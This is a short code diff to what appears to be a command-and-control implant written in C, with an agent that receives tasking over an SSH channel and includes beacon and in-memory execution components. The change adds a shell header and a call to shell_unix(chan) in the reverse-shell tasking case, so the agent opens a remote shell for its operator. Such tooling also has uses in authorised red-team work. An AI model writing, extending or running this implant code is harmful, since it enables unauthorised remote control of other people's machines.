@@ -2,6 +2,7 @@
 #include "config.h"
 #include "b64.h"
 #include "beacon.h"
+#include "shell.h"
 
 // Agent in-memory execution definitions
 #ifdef _WIN32
@@ -555,6 +556,7 @@ int parse_tasking(char *tasking, ssh_channel chan){
 			break;
 		case AGENT_REV_SHELL:
 			printf("Got tasking to start reverse shell\n");
+			shell_unix(chan);
 			break;
 		case AGENT_UP_FILE:
 			printf("Got tasking to upload file %s\n", tasking_arr[j]->opts);
